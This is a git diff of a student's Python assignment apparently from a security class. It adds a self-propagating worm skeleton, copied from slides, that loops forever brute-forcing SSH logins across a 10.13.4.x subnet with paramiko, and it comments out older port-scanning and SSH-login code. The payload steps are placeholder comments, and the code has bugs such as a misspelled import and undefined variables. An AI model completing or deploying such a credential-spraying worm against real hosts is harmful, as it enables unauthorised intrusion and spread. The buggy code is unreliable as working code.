@@ -1,15 +1,99 @@
-import telnetlib 
-import socket
+"""Example Python Worm from class slides
+
+import paramiko
+from iterrtools import product
+
+usernames = ['tim', ‘ben', ...]
+passwords = ['123456', 'qwerty', ...]
+ip_addresses = ['10.13.4.1', ...]
+
+while True: #infinite loop, instant start
+    for user, pw in zip(usernames, passwords):
+        for ip in ip_addresses:
+            try:
+                # try to initiate SSH session
+                client = paramiko.client.SSHClient()
+                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                client.connect(ip, username=user, password=password)
+
+                # execute attacker commands here
+                # copy this worm program to remote machine
+                # execute worm on remote machine
+                
+                # disconnect
+                client.close()
+            except:
+                continue"""
+
+#import telnetlib 
+#import socket
 import paramiko
 import csv
-#recommended libraries
+from itertools import product
+#recommended libraries; attempting to follow slides example
 
-SSH_PORT = 22 # SSH port
-TELNET_PORT = 23 # Telnet port
+#SSH_PORT = 22 # SSH port
+#TELNET_PORT = 23 # Telnet port
+
+usernames = [] #TODO: grab from csv
+passwords = [] #TODO: grab from csv
 IpAddr = "10.13.4." 
-lastdigit = range(0, 25) #exclusive; up to 24
-TIMEOUT = 2  
+lastdigit = range(0, 25) #test all IPs
 
+
+
+while True: #infinite loop, instant start
+    for user, pw in zip(usernames, passwords):
+        for ip in ip_addresses: #this needs to be edited to combine IpAddr and each digit for all in lastdigit
+        #for loop?
+            try:
+                # try to initiate SSH session - search for machines in 10.13.4.0/24 subnet
+                client = paramiko.client.SSHClient()
+                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                client.connect(ip, username=user, password=password)
+
+                #   TODO: execute attacker commands here
+                    #"attacker commands" output two files, open_ssh.log and open_telnet.log
+                    #contains list of IPs with open ssh and telnet ports respectively
+                # copy this worm program to remote machine
+                # execute worm on remote machine
+                
+                # disconnect
+                client.close()
+            except:
+                continue
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#old code: likely works, but written with a lot of help from coPilot and may not fit assignment requirements exactly
+
+"""
 def check_port(ip, port):
     try:
         with socket.create_connection((ip, port), timeout=TIMEOUT):
@@ -95,6 +179,8 @@ def try_ssh(ip, user, password):
 def import_credentials(filename): #import q2.csv here
     with open(filename) as f:
         return [row for row in csv.DictReader(f)] #returns each row as a dictionary
+
+"""
 
 if __name__ == "__main__":
     #check_port()
